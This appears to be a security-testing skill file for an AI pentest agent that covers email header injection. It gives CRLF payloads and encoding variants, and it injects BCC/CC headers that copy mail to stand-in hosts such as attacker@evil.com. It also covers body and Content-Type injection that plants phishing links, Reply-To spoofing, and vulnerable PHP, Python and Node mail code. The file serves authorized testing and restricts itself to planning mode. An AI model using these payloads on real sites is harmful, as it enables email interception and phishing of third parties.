---
name: email-header-injection
description: >-
  Email header injection and spoofing playbook. Use when testing contact forms, email APIs, password reset flows, or any feature that constructs SMTP messages with user-controlled fields. Covers CRLF injection in headers, SPF/DKIM/DMARC bypass, and phishing amplification.
---

# SKILL: Email Header Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert email header injection and authentication bypass. Covers SMTP CRLF injection, SPF/DKIM/DMARC circumvention, display name spoofing, and mail client rendering abuse. Pay particular attention to the nuance between header injection (technical) and email auth bypass (protocol-level) — this skill covers both attack surfaces.

## 0. RELATED ROUTING

- `crlf-injection` — general CRLF injection; email headers are a specific high-value sink
- `ssrf-server-side-request-forgery` — when SMTP server is reachable via SSRF (gopher://smtp)
- `open-redirect` — redirect in password-reset emails as phishing amplification

---

## 1. SMTP HEADER INJECTION FUNDAMENTALS

SMTP headers are separated by CRLF (`\r\n`). If user input is placed into email headers without sanitization, injecting `%0d%0a` (or `\r\n`) adds arbitrary headers.

### Injection anatomy

```
Normal header construction:
  To: user@example.com\r\n
  Subject: Contact Form\r\n
  From: noreply@target.com\r\n

Injected (via Subject field):
  Subject: Hello%0d%0aBcc: attacker@evil.com\r\n
  
Result:
  Subject: Hello\r\n
  Bcc: attacker@evil.com\r\n
```

### Encoding variants to try

| Encoding | Payload |
|---|---|
| URL-encoded | `%0d%0a` |
| Double URL-encoded | `%250d%250a` |
| Unicode | `\u000d\u000a` |
| Raw CRLF | `\r\n` (in raw request) |
| LF only | `%0a` (some SMTP servers accept LF without CR) |
| Null byte + CRLF | `%00%0d%0a` |

---

## 2. ATTACK SCENARIOS

### 2.1 BCC Injection — Silent Email Exfiltration

```
Input field: email / name / subject
Payload: victim@target.com%0d%0aBcc:attacker@evil.com

Effect: attacker receives a copy of every email sent through this form
```

### 2.2 CC Injection with Header Stacking

```
Payload in "From name" field:
  John%0d%0aCc:attacker@evil.com%0d%0aBcc:spy@evil.com

Result headers:
  From: John
  Cc: attacker@evil.com
  Bcc: spy@evil.com
  ... (original headers continue)
```

### 2.3 Body Injection — Full Email Content Control

A blank line (`\r\n\r\n`) separates headers from body in SMTP:

```
Payload in Subject:
  Urgent%0d%0a%0d%0aPlease click: https://evil.com/phish%0d%0a.%0d%0a

Result:
  Subject: Urgent
  
  Please click: https://evil.com/phish
  .
  
(Blank line terminates headers, everything after is body)
```

### 2.4 Reply-To Manipulation for Phishing

```
Payload in From name:
  IT Support%0d%0aReply-To:attacker@evil.com

Victim sees "IT Support" as sender
Replies go to attacker@evil.com
```

### 2.5 Content-Type Injection for HTML Phishing

```
Payload:
  test%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Password Reset</h1><a href="https://evil.com">Click here</a>

Overrides Content-Type → renders HTML in email client
```

---

## 3. COMMON VULNERABLE PATTERNS

### PHP mail()

```php
$to = $_POST['email'];
$subject = $_POST['subject'];
$message = $_POST['message'];
$headers = "From: noreply@target.com";

// ALL parameters are injectable:
mail($to, $subject, $message, $headers);

// $to injection:    victim@x.com%0d%0aCc:attacker@evil.com
// $subject injection: Hello%0d%0aBcc:attacker@evil.com
// $headers injection: From: x%0d%0aBcc:attacker@evil.com
```

### Python smtplib

```python
msg = f"From: {user_from}\r\nTo: {user_to}\r\nSubject: {user_subject}\r\n\r\n{body}"
server.sendmail(from_addr, to_addr, msg)
# user_from / user_subject injectable if not sanitized
```

### Node.js nodemailer

```javascript
let mailOptions = {
    from: req.body.from,      // injectable
    to: 'admin@target.com',
    subject: req.body.subject, // injectable
    text: req.body.message
};
transporter.sendMail(mailOptions);
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. SPF / DKIM / DMARC BYPASS TECHNIQUES
- 5. MAIL CLIENT RENDERING ATTACKS
- 6. CONTACT FORM / EMAIL API INJECTION
- 7. TESTING METHODOLOGY
- 8. DECISION TREE
- 9. QUICK REFERENCE — KEY PAYLOADS
